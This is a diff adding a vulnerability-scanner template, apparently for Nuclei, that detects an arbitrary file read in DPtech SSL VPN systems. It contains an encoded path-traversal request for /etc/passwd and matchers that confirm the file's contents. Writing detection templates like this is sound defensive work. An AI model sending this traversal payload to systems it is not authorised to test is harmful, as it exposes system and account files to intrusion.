@@ -1,0 +1,28 @@
+id: dptech-ssl-vpn-anyfile-read
+info:
+  name: DPtech SSL VPN Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template detects an arbitrary file read vulnerability in DPtech SSL VPN systems, which can potentially expose sensitive files like /etc/passwd.
+  tags: cnvd-2023-69478,cn,ssl-vpn
+http:
+  - raw:
+      - |
+        GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin/bash"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
